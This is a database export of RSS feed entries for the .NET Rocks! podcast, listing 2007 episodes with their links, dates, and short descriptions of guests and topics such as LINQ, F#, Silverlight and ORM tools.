{"_id":620,"_uid":620,"_dt":1373728934199,"_s":"4d3da94390e405795012a5ee39a2a80d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=272","title":"Scott Cate on the MVP Pattern","published":{"$wrap":"$date","v":1189656000000,"h":"2007-09-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott Cate talks about using the Model View Presenter pattern in ASP.NET, as well as his latest software creations and ventures.","author":false,"_id":{"$wrap":"$oid","v":620}}
{"k":"0000000082","o":"0000000395","v":"001"}
{"_id":621,"_uid":621,"_dt":1373728934199,"_s":"58e47e77ab4c48bacf52b0cb324ee2af"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=271","title":"Don Demsak on LINQ to XML","published":{"$wrap":"$date","v":1189483200000,"h":"2007-09-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Don Demsak (DonXML) discusses LINQ to XML and the new XML language features in Visual Basic.","author":false,"_id":{"$wrap":"$oid","v":621}}
{"k":"0000000082","o":"0000000463","v":"001"}
{"_id":622,"_uid":622,"_dt":1373728934200,"_s":"90b8fdb0542eca6e19809c3b4574d869"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=270","title":"Erik Meijer on LINQ!!","published":{"$wrap":"$date","v":1189051200000,"h":"2007-09-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Erik Meijer (a.k.a. the Head in the Box) talks to Carl and Richard in detail about LINQ from soup to nuts. This is a very technical discussion, and not an overview.","author":false,"_id":{"$wrap":"$oid","v":622}}
{"k":"0000000082","o":"0000000488","v":"001"}
{"_id":623,"_uid":623,"_dt":1373728934201,"_s":"8095ca3084d0110c6f0dea57b3ac114b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=269","title":"Larry O'Brien Talks Concurrency!","published":{"$wrap":"$date","v":1188878400000,"h":"2007-09-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Larry O'Brien talks with Richard and Carl about how up and coming CPU architecture is going to invalidate current methods of concurrency programming, and what we can do about it.","author":false,"_id":{"$wrap":"$oid","v":623}}
{"k":"0000000082","o":"0000000548","v":"001"}
{"_id":624,"_uid":624,"_dt":1373728934202,"_s":"ebcbe925cdf970cc3066f1b18bac8537"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=268","title":"Vishwas Lele on MOSS as an Application Platform","published":{"$wrap":"$date","v":1188446400000,"h":"2007-08-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Vishwas Lele talks about thinking of Microsoft Office Sharepoint Server as an application platform for .NET development. With all of the power and flexibility of MOSS, it can no longer be categorized simply as a web portal.","author":false,"_id":{"$wrap":"$oid","v":624}}
{"k":"0000000082","o":"0000000652","v":"001"}
{"_id":625,"_uid":625,"_dt":1373728934203,"_s":"be863f3d3d632eec0a7b424f92261957"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=267","title":"Michael Dunn on Speech Server and OCS","published":{"$wrap":"$date","v":1188273600000,"h":"2007-08-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Michael Dunn tells Carl and Richard about Office Communication Server (OCS) 2007 which has incorporated Live Communication Server with Speech Server. Speech Server is one of the key development elements of OCS, providing the ability for .NET developers to build applications that can both speak and understand speech with minimal coding.","author":false,"_id":{"$wrap":"$oid","v":625}}
{"k":"0000000082","o":"0000000760","v":"001"}
{"_id":626,"_uid":626,"_dt":1373728934204,"_s":"3f4d7644a563727781f6aedd61383925"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=266","title":"Jon Harrop Makes Us F#","published":{"$wrap":"$date","v":1187841600000,"h":"2007-08-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Jon Harrop introduces Carl and Richard to F#, a functional language that runs under the CLR. F# performs like C#, but being a functional language, has interactive scripting (similar to Python) but is rooted in the strong type inference and safety that other functional languages like ML focus on. Being in the CLR means you can build certain parts of your application in F# and then reference them from other languages, the same way VB.NET and C# interoperate.","author":false,"_id":{"$wrap":"$oid","v":626}}
{"k":"0000000082","o":"0000000576","v":"001"}
{"_id":627,"_uid":627,"_dt":1373728934205,"_s":"8cf06bf18a88d20a323124713085a47d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=265","title":"Remi Caron Develops with Off-the-Shelf Software","published":{"$wrap":"$date","v":1187668800000,"h":"2007-08-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Remi Caron, one of the organizers of the SDC conference in the Netherlands, tells Richard and Carl how using standard toolsets and software packages helps him stay focused on his customers' software problems and deliver more powerful solutions faster.","author":false,"_id":{"$wrap":"$oid","v":627}}
{"k":"0000000082","o":"0000000473","v":"001"}
{"_id":628,"_uid":628,"_dt":1373728934206,"_s":"e6087ffeae2556e176fd2d06bd949802"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=264","title":"Donald Farmer on Data Mining","published":{"$wrap":"$date","v":1187236800000,"h":"2007-08-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Donald Farmer talks about data mining with SQL Server and related technologies, including a fascinating discussion about using algorithms for predicting future trends.","author":false,"_id":{"$wrap":"$oid","v":628}}
{"k":"0000000082","o":"0000000427","v":"001"}
{"_id":629,"_uid":629,"_dt":1373728934207,"_s":"5342cb7657d3f99211ff45dd8626dccd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=263","title":"Udi Dahan talks SOA Sense","published":{"$wrap":"$date","v":1187064000000,"h":"2007-08-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Udi Dahan calls in from Israel to talk common sense about SOA. His pragmatic approach to the topic is refreshing and timely.","author":false,"_id":{"$wrap":"$oid","v":629}}
{"k":"0000000082","o":"0000000414","v":"001"}
{"_id":630,"_uid":630,"_dt":1373728934207,"_s":"c0ef06867f917ecb1829a226f7f70a14"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=262","title":"David Hayden on the Enterprise Library","published":{"$wrap":"$date","v":1186632000000,"h":"2007-08-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to David Hayden about the new features of the Microsoft Enterprise Library 3","author":false,"_id":{"$wrap":"$oid","v":630}}
{"k":"0000000082","o":"0000000474","v":"001"}
{"_id":631,"_uid":631,"_dt":1373728934208,"_s":"25a6b01adfbc9b55016851bd5f067366"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=261","title":"Phil Haack on Subtext and Open Source","published":{"$wrap":"$date","v":1186466011000,"h":"2007-08-07T05:53:31.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Phil Haack about his work with Subtext (a derivative of the .Text blog software package) and his work on various open source projects.","author":false,"_id":{"$wrap":"$oid","v":631}}
{"k":"0000000082","o":"0000000456","v":"001"}
{"_id":632,"_uid":632,"_dt":1373728934209,"_s":"81e5ba1cc7d071cf80f48cc4dce2bbab"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=260","title":"Sandcastle!","published":{"$wrap":"$date","v":1186027200000,"h":"2007-08-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Anand Raman and David Wright about Sandcastle, an internal tool for generating code documentation that is now available to the general public.","author":false,"_id":{"$wrap":"$oid","v":632}}
{"k":"0000000082","o":"0000000445","v":"001"}
{"_id":633,"_uid":633,"_dt":1373728934210,"_s":"95ccd82f2c5fc4c862796737c4966354"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=259","title":"Dan Ciruli's Grid Computing Redux","published":{"$wrap":"$date","v":1185854400000,"h":"2007-07-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Dan Ciruli of Digipede Technologies is back to bring us up to date with Digipede Networks, a .NET toolset for enabling grid computing.","author":false,"_id":{"$wrap":"$oid","v":633}}
{"k":"0000000082","o":"0000000409","v":"001"}
{"_id":634,"_uid":634,"_dt":1373728934211,"_s":"20c6b007ce21dfa45994a2a01c64256c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=258","title":"Shawn Wildermuth on Silverlight","published":{"$wrap":"$date","v":1185422400000,"h":"2007-07-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Shawn Wildermuth talks to Richard and Carl about Silverlight from the .NET developer's persepective.","author":false,"_id":{"$wrap":"$oid","v":634}}
{"k":"0000000082","o":"0000000438","v":"001"}
{"_id":635,"_uid":635,"_dt":1373728934211,"_s":"300954ffb47a67f000fd1011c073cfdd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=257","title":"Xiine with Markus Egger","published":{"$wrap":"$date","v":1185249600000,"h":"2007-07-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard discuss with Marcus his new product Xiine, a next gen digital reading platform, DRM and the current state of publishing.","author":false,"_id":{"$wrap":"$oid","v":635}}
{"k":"0000000082","o":"0000000437","v":"001"}
{"_id":636,"_uid":636,"_dt":1373728934212,"_s":"1724762cd20109f08cb73ccacc603367"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=256","title":"Nick Landry on Robotics Studio","published":{"$wrap":"$date","v":1184828033000,"h":"2007-07-19T06:53:53.000Z"},"starred":false,"read":false,"content":"Nick Landry from Infusion calls in to discuss his experiences with (and knowledge of) the somewhat new Microsoft Robotics Studio.","author":false,"_id":{"$wrap":"$oid","v":636}}
{"k":"0000000082","o":"0000000489","v":"001"}
{"_id":637,"_uid":637,"_dt":1373728934213,"_s":"c752769214e9a406f56ab75141a825ad"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=255","title":"Catching up with Miguel de Icaza","published":{"$wrap":"$date","v":1184662614000,"h":"2007-07-17T08:56:54.000Z"},"starred":false,"read":false,"content":"Miguel de Icaza is back to tell us what's new with the Mono project, an open source implementation of the .NET Framework based on FreeBSD with support for Windows, Mac, and Linux.","author":false,"_id":{"$wrap":"$oid","v":637}}
{"k":"0000000082","o":"0000000539","v":"001"}
{"_id":638,"_uid":638,"_dt":1373728934213,"_s":"2b9ddc9a592cd174a85a25fe8a2cbe70"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=254","title":"John Lam on the DLR","published":{"$wrap":"$date","v":1184212800000,"h":"2007-07-12T04:00:00.000Z"},"starred":false,"read":false,"content":"John Lam talks to Carl and Richard about his trek from Canada to Redmond, and his work on dynamic languages, including Ruby CLR, and the Microsoft DLR (Dynamic Language Runtime), which we may find in some future version of the .NET Framework.","author":false,"_id":{"$wrap":"$oid","v":638}}
{"k":"0000000082","o":"0000000435","v":"001"}
{"_id":639,"_uid":639,"_dt":1373728934214,"_s":"10f29541bfdcac25a665e061b1d5f6d1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=253","title":"CSLA with Rockford Lhotka","published":{"$wrap":"$date","v":1184040000000,"h":"2007-07-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Rocky talks about CSLA 3.0, the relationship with  WPF and Silverlight, \"paranoid\" code, pblishing and his experience with ebooks.","author":false,"_id":{"$wrap":"$oid","v":639}}
{"k":"0000000082","o":"0000000485","v":"001"}
{"_id":640,"_uid":640,"_dt":1373728934214,"_s":"7c1e6d7ac6c67bab0a258e3e6ab813ad"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=252","title":"The Identity Panel at TechEd 2007","published":{"$wrap":"$date","v":1183608000000,"h":"2007-07-05T04:00:00.000Z"},"starred":false,"read":false,"content":"In the last of the content from TechEd 2007 Carl and Richard host a panel on Identity issues with Ani Babaian, Michele Leroux Bustamante, Scott Golightly, and Richard Turner.","author":false,"_id":{"$wrap":"$oid","v":640}}
{"k":"0000000082","o":"0000000449","v":"001"}
{"_id":641,"_uid":641,"_dt":1373728934215,"_s":"c671c20336585f6c34abecc555f53e0e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=251","title":"Rogers Sessions Explains Enterprise Architectures!","published":{"$wrap":"$date","v":1183435200000,"h":"2007-07-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Roger Sessions talks to Carl and Richard about enterprise architecture, with a focus on dealing with software complexity.","author":false,"_id":{"$wrap":"$oid","v":641}}
{"k":"0000000082","o":"0000000487","v":"001"}
{"_id":642,"_uid":642,"_dt":1373728934216,"_s":"b4ec3b6efcb7907fe836c76a43487816"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=250","title":"Team System Panel from TechEd 2007","published":{"$wrap":"$date","v":1183003200000,"h":"2007-06-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Another great panel discussion from TechEd 2007! Carl and Richard talk to a panel of experts about various topics around VSTS and team development focusing on team challenges.","author":false,"_id":{"$wrap":"$oid","v":642}}
{"k":"0000000082","o":"0000000444","v":"001"}
{"_id":643,"_uid":643,"_dt":1373728934216,"_s":"08e8a68780676c6dded1c9c57b96095b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=249","title":"Box and Sells on the State of Publishing","published":{"$wrap":"$date","v":1182817789000,"h":"2007-06-26T00:29:49.000Z"},"starred":false,"read":false,"content":"Don Box and Chris Sells talk to Carl and Richard about a myriad of things including the state of publishing, especially books.","author":false,"_id":{"$wrap":"$oid","v":643}}
{"k":"0000000082","o":"0000000521","v":"001"}
{"_id":644,"_uid":644,"_dt":1373728934217,"_s":"eca17c046572f94836f339fc46909ff9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=248","title":"Introducing Acropolis","published":{"$wrap":"$date","v":1182398400000,"h":"2007-06-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk with members of the Microsoft Acropolis team at TechEd 2007. Acropolis is a software factory-ish toolset that allows business developers to develop quality line-of-business WPF applications with ease.","author":false,"_id":{"$wrap":"$oid","v":644}}
{"k":"0000000082","o":"0000000485","v":"001"}
{"_id":645,"_uid":645,"_dt":1373728934218,"_s":"cc4ec59183aaca377d9a3b604cba4aff"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=247","title":"Mark Pollack on Spring.NET","published":{"$wrap":"$date","v":1182288678000,"h":"2007-06-19T21:31:18.000Z"},"starred":false,"read":false,"content":"Mark Pollack is back to talk about the latest version of Spring.NET, a frawmeowrk for extending the capabilities of the .NET Framework modeled after the Java-based Spring framework.","author":false,"_id":{"$wrap":"$oid","v":645}}
{"k":"0000000082","o":"0000000480","v":"001"}
{"_id":646,"_uid":646,"_dt":1373728934218,"_s":"677af1bbd8ab999becf455de9235e207"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=246","title":"ASP.NET Scalability Panel","published":{"$wrap":"$date","v":1181793600000,"h":"2007-06-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Recorded at the Virtual TechEd Stage, Carl and Richard welcome Stephen Forte, Kent Alstad, Rob Howard, and Steve Smith for a lively discussion around ASP.NET Scalability issues.","author":false,"_id":{"$wrap":"$oid","v":646}}
{"k":"0000000082","o":"0000000402","v":"001"}
{"_id":647,"_uid":647,"_dt":1373728934219,"_s":"83edc62d2248b162a3bc97568f371630"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=245","title":"Christophe Wille on SharpDevelop","published":{"$wrap":"$date","v":1181677604000,"h":"2007-06-12T19:46:44.000Z"},"starred":false,"read":false,"content":"Christophe Wille talks about SharpDevelop, an open-source free alternative to Visual Studio.","author":false,"_id":{"$wrap":"$oid","v":647}}
{"k":"0000000082","o":"0000000475","v":"001"}
{"_id":648,"_uid":648,"_dt":1373728934220,"_s":"e6ba6d0ada01ded56d0e91be5457219a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=244","title":"Scott Stanfield on the Importance of Aesthetics","published":{"$wrap":"$date","v":1181188800000,"h":"2007-06-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott Stanfield from Vertigo Software is back (see show #11) to talk about cultivating an aesthetic sense around software, media, and user experience.","author":false,"_id":{"$wrap":"$oid","v":648}}
{"k":"0000000082","o":"0000000687","v":"001"}
{"_id":649,"_uid":649,"_dt":1373728934220,"_s":"06b43fc8010d2881f14e605125843194"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=243","title":"Scripps Institute","published":{"$wrap":"$date","v":1181002895000,"h":"2007-06-05T00:21:35.000Z"},"starred":false,"read":false,"content":"Carl and Richard interview Peter Kuhn from the Scripps Institute about an application he designed to allow cancer researchers to visualize molecules and annotate them with real time collaboration. The application was written with beta versions of WPF, and champoined by Tim Huckaby's team at Interknowlogy and evangelized by Eileen Rumwell and Stephen Forte. This is an amazing success story.","author":false,"_id":{"$wrap":"$oid","v":649}}
{"k":"0000000082","o":"0000000420","v":"001"}
{"_id":650,"_uid":650,"_dt":1373728934221,"_s":"ecc1be48b340a3731a1a2b3207b9da12"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=242","title":"Frans Bouma on LLBLGen","published":{"$wrap":"$date","v":1180584000000,"h":"2007-05-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk with Frans Bouma, author of LLBLGen, a very popular ORM modeling and code generation tool for .NET","author":false,"_id":{"$wrap":"$oid","v":650}}
{"k":"0000000082","o":"0000000517","v":"001"}
{"_id":651,"_uid":651,"_dt":1373728934222,"_s":"a1117cfb1c7ebcc50d205e41169d7d15"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=241","title":"Nick Benton and Claudio Russo are Polyphonic C#!","published":{"$wrap":"$date","v":1180410073000,"h":"2007-05-29T03:41:13.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk with Nick Benton and Claudio Russo from Microsoft Research UK about Polyphonic C# (now part of C-Omega) which adds asynchronous concurrency abstractions to the language.","author":false,"_id":{"$wrap":"$oid","v":651}}
{"k":"0000000082","o":"0000000506","v":"001"}
{"_id":652,"_uid":652,"_dt":1373728934223,"_s":"37e843ac02a570f16fd2eb238ec51c4d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=240","title":"The ORM Smackdown!","published":{"$wrap":"$date","v":1179997915000,"h":"2007-05-24T09:11:55.000Z"},"starred":false,"read":false,"content":"Ted Neward and Oren Eini agreed to discuss Object Relational Mapping practices at DevTeach in Montreal, Quebec May 16, 2007. This is a slightly longer show than usual, but we think you'll agree it was worth it.","author":false,"_id":{"$wrap":"$oid","v":652}}
{"k":"0000000082","o":"0000000421","v":"001"}
{"_id":653,"_uid":653,"_dt":1373728934223,"_s":"6e773bde4be49becc693674b3312f634"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=239","title":"Rob McGovern on Virtual Earth","published":{"$wrap":"$date","v":1179806400000,"h":"2007-05-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Rob McGovern from Infusion talks about the extremely cool Virtual Earth SDK: business cases, features, and how-to.","author":false,"_id":{"$wrap":"$oid","v":653}}
{"k":"0000000082","o":"0000000446","v":"001"}
{"_id":654,"_uid":654,"_dt":1373728934224,"_s":"27cfc824cb397380afc0361e334380d1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=238","title":"Eric Sink and Martin Woodward on CI and Source Control","published":{"$wrap":"$date","v":1179374400000,"h":"2007-05-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Eric Sink is back, this time with Martin Woodward to chat about Source Control systems and Continuous Integration.","author":false,"_id":{"$wrap":"$oid","v":654}}
{"k":"0000000082","o":"0000000411","v":"001"}
{"_id":655,"_uid":655,"_dt":1373728934225,"_s":"a13e882d4c3678d5201be4dc37974578"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=237","title":"Rustan Leino on Spec #","published":{"$wrap":"$date","v":1179201600000,"h":"2007-05-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Rustan Leino discusses with Carl and Richard the features and functionality of the Spec # programming language.","author":false,"_id":{"$wrap":"$oid","v":655}}
{"k":"0000000082","o":"0000000410","v":"001"}
{"_id":656,"_uid":656,"_dt":1373728934225,"_s":"2c99c41ef65c9b7dcdaf6acca798120b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=236","title":"Eric Evans on Domain Driven Design","published":{"$wrap":"$date","v":1178796906000,"h":"2007-05-10T11:35:06.000Z"},"starred":false,"read":false,"content":"Eric Evans offers his insights on good software development using Domain Driven Design techniques.","author":false,"_id":{"$wrap":"$oid","v":656}}
{"k":"0000000082","o":"0000000478","v":"001"}
{"_id":657,"_uid":657,"_dt":1373728934226,"_s":"5590cc39722e6a3cbb7089ed85effd88"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=235","title":"Barkol, Gallo, and Vavilalla on ASP.NET AJAX","published":{"$wrap":"$date","v":1178596800000,"h":"2007-05-08T04:00:00.000Z"},"starred":false,"read":false,"content":"David Barkol, Alessandro Gallo, and Rama Krishna Vavilala talk about ASP.NET AJAX, and thier upcoming book ASP.NET AJAX in Action from Manning Publications.","author":false,"_id":{"$wrap":"$oid","v":657}}
{"k":"0000000082","o":"0000000540","v":"001"}
{"_id":658,"_uid":658,"_dt":1373728934227,"_s":"2d2f96036c0d57e8dc3dd38c3e3ba4f6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=234","title":"Frank Savage on Programming the XBox 360","published":{"$wrap":"$date","v":1178189713000,"h":"2007-05-03T10:55:13.000Z"},"starred":false,"read":false,"content":"Frank Savage from the XNA team discusses the coolness that is XNA Game Studio Express! He also waxes poetic about his days on the Strike Commander and Wing Commander 3 teams, as well as more recent endeavors. Awesome show!","author":false,"_id":{"$wrap":"$oid","v":658}}
{"k":"0000000082","o":"0000000469","v":"001"}
{"_id":659,"_uid":659,"_dt":1373728934227,"_s":"6661eea3272d55b8c966302cb7ddcc8e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=233","title":"Brad Abrams Announces Silverlight","published":{"$wrap":"$date","v":1178014488000,"h":"2007-05-01T10:14:48.000Z"},"starred":false,"read":false,"content":"Brad Abrams from the .NET Framework team is here to announce Silverlight, painting a picture of the near future as a rich media web experience. Don't miss it!","author":false,"_id":{"$wrap":"$oid","v":659}}
{"k":"0000000082","o":"0000000501","v":"001"}
{"_id":660,"_uid":660,"_dt":1373728934228,"_s":"2401fd50eef22d3b28858fdfe256376c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=232","title":"Jeff Atwood on the Human Side of Software Development","published":{"$wrap":"$date","v":1177560000000,"h":"2007-04-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Jeff Atwood from codinghorror.com tells Carl and Richard what's on his mind, including his recommended reading list, and above all the human side of software development.","author":false,"_id":{"$wrap":"$oid","v":660}}
{"k":"0000000082","o":"0000000479","v":"001"}
{"_id":661,"_uid":661,"_dt":1373728934229,"_s":"16e604614bc553cdc4db8ff01eac7b5d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=231","title":"Fred Chong On SaaS (Software as a Service)","published":{"$wrap":"$date","v":1177371301000,"h":"2007-04-23T23:35:01.000Z"},"starred":false,"read":false,"content":"Carl and Richard speak with Fred Chong about SaaS (Software as a Service) from the basic concepts to issues of appropriateness to products like HR and LitWare.","author":false,"_id":{"$wrap":"$oid","v":661}}
{"k":"0000000082","o":"0000000492","v":"001"}
{"_id":662,"_uid":662,"_dt":1373728934229,"_s":"75dc71f344f0228309909f4ad524fbec"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=230","title":"Catching up with Rob Howard","published":{"$wrap":"$date","v":1176944173000,"h":"2007-04-19T00:56:13.000Z"},"starred":false,"read":false,"content":"Ex-ASP.NET Team Member turned businessman Rob Howard tells us what he's been up to with Community Server, CodeSmith Tools, and a few other projects. As always, Rob has some great stories.","author":false,"_id":{"$wrap":"$oid","v":662}}
{"k":"0000000082","o":"0000000487","v":"001"}
{"_id":663,"_uid":663,"_dt":1373728934230,"_s":"cfc12f699c09618e9418489efca956b8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=229","title":"Rick Brewster on Paint.NET","published":{"$wrap":"$date","v":1176790512000,"h":"2007-04-17T06:15:12.000Z"},"starred":false,"read":false,"content":"Rick Brewster, the lead developer of Paint.NET, discusses the open-source paint program from the beginning to the present and into the future. It's a great story, and a great project!","author":false,"_id":{"$wrap":"$oid","v":663}}
{"k":"0000000082","o":"0000000516","v":"001"}
{"_id":664,"_uid":664,"_dt":1373728934231,"_s":"d4b1ab7f4549ac7e984ff863fa389474"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=228","title":"Bret Updegraff Talks SQL Server Reporting Services","published":{"$wrap":"$date","v":1176345432000,"h":"2007-04-12T02:37:12.000Z"},"starred":false,"read":false,"content":"Bret Updegraf shares his knowledge of SQL Reporting Services with Carl and Richard in this show. Bret is the author of SQL Server 2005 Reporting Services in Action from Manning Publishing.","author":false,"_id":{"$wrap":"$oid","v":664}}
{"k":"0000000082","o":"0000000556","v":"001"}
{"_id":665,"_uid":665,"_dt":1373728934231,"_s":"77d15314ad1ac46301eb60e35c40e5cd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=227","title":"Dax Pandhi talks WPF and Expression","published":{"$wrap":"$date","v":1176171153000,"h":"2007-04-10T02:12:33.000Z"},"starred":false,"read":false,"content":"Graphics guru and WPF wonk Dax Pandhi shares his thoughts on WPF, WPF/e, Expression suite in general, and Blend in particular. You'll hear the story of how Dax came to be the Pwop graphics guy as well as his contributions to the WPF community.","author":false,"_id":{"$wrap":"$oid","v":665}}
{"k":"0000000082","o":"0000000471","v":"001"}
{"_id":666,"_uid":666,"_dt":1373728934232,"_s":"e5c317aa7cf98b8bd420797c60478b63"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=226","title":"Daniel Simmons on ADO.NET Entity Framework","published":{"$wrap":"$date","v":1175790705000,"h":"2007-04-05T16:31:45.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk about the ADO.NET Entity Framework, a new ORM technology from Microsoft, with Daniel Simmons, a dev lead on ADO.NET at Microsoft.","author":false,"_id":{"$wrap":"$oid","v":666}}
{"k":"0000000082","o":"0000000527","v":"001"}
{"_id":667,"_uid":667,"_dt":1373728934233,"_s":"e21a54931427d1769f253e43d8be736a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=225","title":"Dan Appleman Talks About Discoverability!","published":{"$wrap":"$date","v":1175560311000,"h":"2007-04-03T00:31:51.000Z"},"starred":false,"read":false,"content":"Carl and Richard catch up with Dan Appleman at Devconnections in Orlando. The big topic is the discoverability of pertinent information through search engines. His solution? You'll have to listen to find out.","author":false,"_id":{"$wrap":"$oid","v":667}}
{"k":"0000000082","o":"0000000505","v":"001"}
{"_id":668,"_uid":668,"_dt":1373728934234,"_s":"2bca48b6ee9bea465d828fe52405ccd9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=224","title":"Oren Eini -NHibernate and Rhino Mocks","published":{"$wrap":"$date","v":1175166010000,"h":"2007-03-29T11:00:10.000Z"},"starred":false,"read":false,"content":"Oren Eini, creator of Rhino Mocks, reprises his DNR tv appearance with discussions on the effectiveness and power of NHibernate, coding advantages and the joys of authoring open source work.","author":false,"_id":{"$wrap":"$oid","v":668}}
{"k":"0000000082","o":"0000000518","v":"001"}
{"_id":669,"_uid":669,"_dt":1373728934234,"_s":"5aac43dd22dc30974edb712cc19cedf2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=223","title":"Bill Wagner on C# and the Grateful Dead","published":{"$wrap":"$date","v":1174969406000,"h":"2007-03-27T04:23:26.000Z"},"starred":false,"read":false,"content":"Bill Wagner is back to talk about C# with topics from his best-selling book, Effective C#. Bill is a multi-faceted developer, however, and the conversation turned to topics like community. Great stuff.","author":false,"_id":{"$wrap":"$oid","v":669}}
{"k":"0000000082","o":"0000000388","v":"001"}
{"_id":670,"_uid":670,"_dt":1373728934235,"_s":"feeddc90bb4735f77f755d45e30608f5"}
